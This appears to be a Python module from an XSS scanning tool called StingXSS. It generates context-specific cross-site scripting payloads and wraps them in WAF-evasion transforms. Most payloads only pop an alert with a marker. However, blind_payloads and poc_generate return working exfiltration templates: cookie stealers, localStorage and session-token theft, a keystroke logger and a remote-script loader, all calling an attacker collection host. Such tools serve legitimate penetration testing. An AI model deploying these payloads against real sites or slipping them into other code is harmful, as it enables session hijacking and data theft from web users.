# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
StingXSS — engine/payload_gen.py
Context-aware XSS payload generator with WAF evasion transforms.

Logic:
  1. Select a base payload set for the detected ReflectionContext.
  2. Apply WAF evasion transforms appropriate to the detected WAF strategy.
  3. Append any user-supplied custom payloads.
  4. Return a deduplicated list ready for injection.
"""

from __future__ import annotations

import base64
import random
import string
from typing import List, Optional

from ..reporter import ReflectionContext

from commonhuman_payloads.encoders import (
  apply_evasion as _pkg_apply_evasion,
  apply_evasion_chain,
  EVASION_NAMES,
  EVASION_BACKTICK,
  EVASION_CASE_MIXING,
  EVASION_CHUNKED_TAGS,
  EVASION_COMMENT_BREAK,
  EVASION_CSS_EXPR,
  EVASION_DOUBLE_ENCODE,
  EVASION_FROMCHARCODE,
  EVASION_HTML_ENCODE,
  EVASION_NEWLINE,
  EVASION_NONE,
  EVASION_NULL_BYTE,
  EVASION_UNICODE,
  EVASION_UNESCAPE,
)
from commonhuman_payloads.xss import (
  HTML_BODY, ATTR_DOUBLE, ATTR_SINGLE, ATTR_UNQUOTED, ATTR_NAME,
  TAG_NAME, TEXTAREA, TITLE, NOSCRIPT, IFRAME_SRCDOC, OBJECT_DATA,
  COMMENT, CSS, CSS_VALUE,
  SCRIPT_STRING_D, SCRIPT_STRING_S, SCRIPT_BARE, SCRIPT_TEMPLATE,
  SCRIPT_REGEX, SCRIPT_COMMENT, EVENT_HANDLER, URL_ATTR, SCRIPT_SRC,
  ANGULAR_TEMPLATE, ANGULAR_TEMPLATE_ALT, ANGULAR_ATTR,
  VUE_TEMPLATE, JS_HOISTING, DANGLING_MARKUP, CSS_TRANSITION,
  EXTRA_NO_INTERACTION, FILE_UPLOAD, RESTRICTED_CHARS, POLYGLOT,
  WAF_BYPASS_GLOBAL, WAF_BYPASS_DOUBLE_ENCODE, PROTOTYPE_POLLUTION,
  CLASSIC_LEGACY, ENCODING, CONTENT_TYPE, MODERN_BROWSER, STORED_XSS,
  UNICODE_CASE_BYPASS, UNICODE_LINE_SEP, DOM_CLOBBERING, REPLACE_PATTERN,
  RADIX_OBFUSCATION, UNICODE_URL, SANITIZER_BYPASS, CSP_INJECTION, DATA_URI,
)

def _fmt(template: str, marker: str) -> str:
  """Substitute ``{marker}`` in *template* without invoking Python's full
  format mini-language.  This avoids ``IndexError`` / ``KeyError`` when a
  payload itself contains bare ``{}`` or ``{0.__class__}`` etc."""
  return template.replace("{marker}", marker)


# ---------------------------------------------------------------------------
# Confirmation marker — unique string embedded in every payload.
# ---------------------------------------------------------------------------
CONFIRM_MARKER_PREFIX = "StingXSS_"


def make_confirm_marker() -> str:
  suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
  return f"{CONFIRM_MARKER_PREFIX}{suffix}"


# ---------------------------------------------------------------------------
# Context → payload list map
# ---------------------------------------------------------------------------

# DATA_URI entries that use sentinels encode the marker in base64, so the marker
# won't appear literally in the rendered payload.
_DATA_URI_PLAIN = [p for p in DATA_URI if not p.startswith("__B64_")]

_CONTEXT_MAP = {
  ReflectionContext.HTML_BODY:            HTML_BODY + _DATA_URI_PLAIN + UNICODE_CASE_BYPASS + DOM_CLOBBERING + RADIX_OBFUSCATION + SANITIZER_BYPASS,
  ReflectionContext.ATTR_DOUBLE:          ATTR_DOUBLE,
  ReflectionContext.ATTR_SINGLE:          ATTR_SINGLE,
  ReflectionContext.ATTR_UNQUOTED:        ATTR_UNQUOTED,
  ReflectionContext.ATTR_NAME:            ATTR_NAME,
  ReflectionContext.SCRIPT_STRING_D:      SCRIPT_STRING_D + UNICODE_LINE_SEP + REPLACE_PATTERN,
  ReflectionContext.SCRIPT_STRING_S:      SCRIPT_STRING_S + UNICODE_LINE_SEP,
  ReflectionContext.SCRIPT_BARE:          SCRIPT_BARE,
  ReflectionContext.SCRIPT_TEMPLATE:      SCRIPT_TEMPLATE,
  ReflectionContext.SCRIPT_REGEX:         SCRIPT_REGEX,
  ReflectionContext.SCRIPT_COMMENT:       SCRIPT_COMMENT,
  ReflectionContext.EVENT_HANDLER:        EVENT_HANDLER,
  ReflectionContext.URL_ATTR:             URL_ATTR + UNICODE_URL,
  ReflectionContext.SCRIPT_SRC:           SCRIPT_SRC,
  ReflectionContext.CSS:                  CSS,
  ReflectionContext.CSS_VALUE:            CSS_VALUE,
  ReflectionContext.TEXTAREA:             TEXTAREA,
  ReflectionContext.TITLE:                TITLE,
  ReflectionContext.IFRAME_SRCDOC:        IFRAME_SRCDOC,
  ReflectionContext.NOSCRIPT:             NOSCRIPT,
  ReflectionContext.OBJECT_DATA:          OBJECT_DATA + _DATA_URI_PLAIN,
  ReflectionContext.TAG_NAME:             TAG_NAME,
  ReflectionContext.COMMENT:              COMMENT,
  ReflectionContext.ANGULAR_TEMPLATE:     ANGULAR_TEMPLATE,
  ReflectionContext.ANGULAR_TEMPLATE_ALT: ANGULAR_TEMPLATE_ALT,
  ReflectionContext.ANGULAR_ATTR:         ANGULAR_ATTR,
  ReflectionContext.VUE_TEMPLATE:         VUE_TEMPLATE,
  ReflectionContext.JS_HOISTING:          JS_HOISTING,
  ReflectionContext.DANGLING_MARKUP:      DANGLING_MARKUP,
  ReflectionContext.UNKNOWN:              HTML_BODY + ATTR_DOUBLE,
}


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate(
  context:         ReflectionContext,
  evasion:         str = EVASION_NONE,
  marker:          Optional[str] = None,
  custom_payloads: Optional[List[str]] = None,
  level:           int = 1,
  randomize:       bool = False,
  evasion_chain:   Optional[List[str]] = None,
) -> List[str]:
  """
  Return a list of payloads tuned for `context` with `evasion` applied.

  level 1 = first 3 payloads per context (fast)
  level 2 = first 6
  level 3 = all

  evasion_chain overrides evasion — transforms are applied sequentially.
  randomize shuffles the final list to avoid sequential WAF pattern matching.
  """
  if marker is None:
    marker = make_confirm_marker()

  base = _CONTEXT_MAP.get(context, HTML_BODY)

  limits = {1: 3, 2: 6, 3: len(base)}
  base = base[: limits.get(level, 3)]

  payloads = [_fmt(p, marker) for p in base]

  # Resolve base64 data-URL sentinels emitted by DATA_URI / OBJECT_DATA payloads.
  resolved = []
  for p in payloads:
    if p.startswith("__B64_DATA_URL__:"):
      inner_marker = p[len("__B64_DATA_URL__:"):]
      inner_html   = f"<script>alert('{inner_marker}')</script>"
      encoded      = base64.b64encode(inner_html.encode()).decode()
      resolved.append(f"data:text/html;base64,{encoded}")
    elif p.startswith("__B64_SCRIPT__:"):
      # Produces full <meta> refresh tag with base64 data URI
      inner_marker = p[len("__B64_SCRIPT__:"):]
      inner_html   = f"<script>alert('{inner_marker}')</script>"
      encoded      = base64.b64encode(inner_html.encode()).decode()
      resolved.append(f'<meta http-equiv=refresh content="0;url=data:text/html;base64,{encoded}">')
    elif p.startswith("__B64_SVG_USE__:"):
      # Produces full <svg><use> tag with base64 SVG data URI
      inner_marker = p[len("__B64_SVG_USE__:"):]
      svg = (
        f"<svg id='x' xmlns='http://www.w3.org/2000/svg'>"
        f"<script>alert('{inner_marker}')</script></svg>"
      )
      encoded = base64.b64encode(svg.encode()).decode()
      resolved.append(f'<svg><use href="data:image/svg+xml;base64,{encoded}"></svg>')
    elif p.startswith("__B64_HTML_IFRAME__:"):
      inner_marker = p[len("__B64_HTML_IFRAME__:"):]
      inner_html   = f"<script>alert('{inner_marker}')</script>"
      encoded      = base64.b64encode(inner_html.encode()).decode()
      resolved.append(f"<iframe src=\"data:text/html;base64,{encoded}\">")
    else:
      resolved.append(p)
  payloads = resolved

  if evasion_chain:
    payloads = [apply_evasion_chain(p, evasion_chain) for p in payloads]
  elif evasion != EVASION_NONE:
    transformed = []
    for p in payloads:
      transformed.extend(_apply_evasion(p, evasion))
    payloads = transformed

  # For double-encode evasion, prepend targeted payloads that avoid
  # onerror/onload/script — common keyword blocks in raw-string WAFs (w1d style).
  if evasion == EVASION_DOUBLE_ENCODE and not evasion_chain:
    de_targeted = [_pkg_apply_evasion(_fmt(p, marker), EVASION_DOUBLE_ENCODE) for p in WAF_BYPASS_DOUBLE_ENCODE]
    payloads = de_targeted + payloads

  if custom_payloads:
    # Support {marker} templates in custom payloads; raw strings pass through unchanged.
    payloads.extend(_fmt(p, marker) for p in custom_payloads)

  # Deduplicate preserving order
  seen: set = set()
  result = []
  for p in payloads:
    if p not in seen:
      seen.add(p)
      result.append(p)

  if randomize:
    random.shuffle(result)

  return result


def blind_payloads(callback_url: str) -> List[str]:
  """Return blind XSS payloads that phone home to `callback_url`."""
  cb = callback_url.rstrip("/")
  return [
    f'"><script src="{cb}/venom.js"></script>',
    f"'><script src='{cb}/venom.js'></script>",
    f"<img src=x onerror=\"var s=document.createElement('script');s.src='{cb}/venom.js';document.head.appendChild(s)\">",
    f"javascript:eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39))+'{cb}/venom.js'+String.fromCharCode(39,59,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41))",
    f"</script><script>fetch('{cb}/?c='+document.cookie)</script>",
    f'<svg><animate onbegin=\'fetch("{cb}/?c="+document.cookie)\' attributeName=x dur=1s>',
    f'<svg><animate onend=\'fetch("{cb}/?c="+document.cookie)\' attributeName=x dur=1s>',
    f'<xss oncontentvisibilityautostatechange=\'fetch("{cb}/?c="+document.cookie)\' style=display:block;content-visibility:auto>',
    f'<style>@keyframes x{{}}</style><xss style="animation-name:x" onanimationend=\'fetch("{cb}/?c="+document.cookie)\'></xss>',
    f'<xss onfocus=\'fetch("{cb}/?c="+document.cookie)\' autofocus tabindex=1>',
  ]


def file_upload_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads for injection into uploaded SVG/HTML files."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in FILE_UPLOAD]


def restricted_char_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads for environments that filter parens, angle brackets, etc."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in RESTRICTED_CHARS]


def polyglot_payloads(marker: Optional[str] = None) -> List[str]:
  """Return multi-context polyglot payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in POLYGLOT]


def waf_bypass_payloads(marker: Optional[str] = None) -> List[str]:
  """Return WAF-bypass payloads using global object obfuscation."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in WAF_BYPASS_GLOBAL]


def prototype_pollution_payloads(marker: Optional[str] = None) -> List[str]:
  """Return prototype pollution gadget payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in PROTOTYPE_POLLUTION]


def classic_legacy_payloads(marker: Optional[str] = None) -> List[str]:
  """Return classic/legacy XSS vectors (marquee, VBScript, etc.)."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in CLASSIC_LEGACY]


def encoding_payloads(marker: Optional[str] = None) -> List[str]:
  """Return encoding-based bypass payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in ENCODING]


def content_type_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads for SVG/XML/XSL/XHTML content-type responses."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in CONTENT_TYPE]


def css_transition_payloads(marker: Optional[str] = None) -> List[str]:
  """Return CSS transition/webkit animation event payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in CSS_TRANSITION]


def extra_no_interaction_payloads(marker: Optional[str] = None) -> List[str]:
  """Return additional no-interaction event payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in EXTRA_NO_INTERACTION]


def modern_browser_payloads(marker: Optional[str] = None) -> List[str]:
  """Return modern browser API abuse payloads (Import Maps, Shadow DOM, Trusted Types, etc.)."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in MODERN_BROWSER]


def stored_xss_payloads(marker: Optional[str] = None) -> List[str]:
  """Return stored XSS payloads.

  Detection payloads come first — they embed the marker directly in the HTML
  response so that the revisit-based ``_marker_in`` check can confirm storage.
  Exfil / advanced payloads follow for breadth.
  """
  if marker is None:
    marker = make_confirm_marker()
  # Short, server-reflectable detection payloads placed first so the revisit
  # check fires as early as possible.
  detection: List[str] = [
    f"<img src=x onerror=alert('{marker}')>",
    f"<svg onload=alert('{marker}')>",
    f"<script>alert('{marker}')</script>",
    f"<body onload=alert('{marker}')>",
    f"<details open ontoggle=alert('{marker}')>",
  ]
  return detection + [_fmt(p, marker) for p in STORED_XSS]


def unicode_case_bypass_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads exploiting toUpperCase() Unicode normalisation (ſ→S etc.)."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in UNICODE_CASE_BYPASS]


def unicode_line_sep_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads using U+2028/U+2029 as JS line terminators to break string contexts."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in UNICODE_LINE_SEP]


def dom_clobbering_payloads(marker: Optional[str] = None) -> List[str]:
  """Return DOM clobbering payloads (id=/name= attribute-based property overwrites)."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in DOM_CLOBBERING]


def replace_pattern_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads exploiting String.replace() special patterns ($`, $&, $')."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in REPLACE_PATTERN]


def radix_obfuscation_payloads(marker: Optional[str] = None) -> List[str]:
  """Return radix-based obfuscation payloads (toString(radix), for-in-self brute force)."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in RADIX_OBFUSCATION]


def unicode_url_payloads(marker: Optional[str] = None) -> List[str]:
  """Return Unicode URL/domain normalisation bypass payloads."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in UNICODE_URL]


def sanitizer_bypass_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads that bypass non-recursive HTML sanitizers (e.g. sanitize-html ≤1.4.2)."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in SANITIZER_BYPASS]


def csp_injection_payloads(marker: Optional[str] = None) -> List[str]:
  """Return payloads for CSP header injection via user-controlled header values."""
  if marker is None:
    marker = make_confirm_marker()
  return [_fmt(p, marker) for p in CSP_INJECTION]


def prototype_pollution_params(marker: Optional[str] = None) -> List[tuple[str, str]]:
  """
  Return (param_name, value) pairs for active prototype pollution testing.
  These inject via query string like ?__proto__[key]=value.
  """
  if marker is None:
    marker = make_confirm_marker()
  return [
    ("__proto__[html]",          f"<img src=x onerror=alert('{marker}')>"),
    ("__proto__[src]",           f"//attacker.example/{marker}.js"),
    ("__proto__[innerText]",     f"<img src=x onerror=alert('{marker}')>"),
    ("__proto__[sourceURL]",     f"\nalert('{marker}')"),
    ("__proto__[ALLOWED_TAGS][]","script"),
    ("constructor[prototype][html]", f"<img src=x onerror=alert('{marker}')>"),
    ("__proto__[template]",      f"<img src=x onerror=alert('{marker}')>"),
  ]


# ---------------------------------------------------------------------------
# Evasion transforms
# ---------------------------------------------------------------------------

def data_uri_payloads(marker: Optional[str] = None) -> List[str]:
  """Return data: URI injection payloads (plain and base64-encoded variants)."""
  if marker is None:
    marker = make_confirm_marker()
  raw = [_fmt(p, marker) for p in DATA_URI]
  # Resolve sentinels
  resolved = []
  for p in raw:
    if p.startswith("__B64_SCRIPT__:"):
      m2 = p[len("__B64_SCRIPT__:"):]
      inner = f"<script>alert('{m2}')</script>"
      encoded = base64.b64encode(inner.encode()).decode()
      resolved.append(f'<meta http-equiv=refresh content="0;url=data:text/html;base64,{encoded}">')
    elif p.startswith("__B64_SVG_USE__:"):
      m2 = p[len("__B64_SVG_USE__:"):]
      svg = f"<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert('{m2}')</script></svg>"
      encoded = base64.b64encode(svg.encode()).decode()
      resolved.append(f'<svg><use href="data:image/svg+xml;base64,{encoded}"></svg>')
    elif p.startswith("__B64_HTML_IFRAME__:"):
      m2 = p[len("__B64_HTML_IFRAME__:"):]
      inner = f"<script>alert('{m2}')</script>"
      resolved.append(f"<iframe src=\"data:text/html;base64,{base64.b64encode(inner.encode()).decode()}\">")
    else:
      resolved.append(p)
  return resolved


def poc_generate(oob_url: str = "https://attacker.example") -> dict:
  """Return a dict of ready-to-use PoC payload templates.

  Callers substitute the confirmed payload's parameter+URL to build a real PoC.
  ``oob_url`` is the attacker-controlled OOB collection server.
  """
  oob = oob_url.rstrip("/")
  return {
    "cookie_stealer": (
      f"<img src=x onerror=\"fetch('{oob}/?c='+encodeURIComponent(document.cookie))\">"
    ),
    "cookie_stealer_onmousemove": (
      f"<body onmousemove=\"this.onmousemove=null;"
      f"fetch('{oob}/?c='+encodeURIComponent(document.cookie))\">"
    ),
    "localstorage_exfil": (
      f"<img src=x onerror=\"fetch('{oob}/?ls='+btoa(JSON.stringify(localStorage)))\">"
    ),
    "session_token_exfil": (
      f"<script>fetch('/api/user').then(r=>r.json())"
      f".then(d=>fetch('{oob}/?d='+btoa(JSON.stringify(d)))).catch(()=>{{}})</script>"
    ),
    "iframe_keylogger": (
      f"<script>document.onkeypress=e=>fetch('{oob}/?k='+e.key)</script>"
    ),
    "stealth_onmousemove": (
      f"<div style='position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999'"
      f" onmousemove=\"this.onmousemove=null;"
      f"fetch('{oob}/?c='+encodeURIComponent(document.cookie))\"></div>"
    ),
    "remote_script": (
      f"<script src='{oob}/payload.js'></script>"
    ),
  }


def _apply_evasion(payload: str, evasion: str) -> List[str]:
  """Return [original, transformed] — always include the original."""
  try:
    transformed = _pkg_apply_evasion(payload, evasion)
    return [payload] if transformed == payload else [payload, transformed]
  except Exception:
    return [payload]
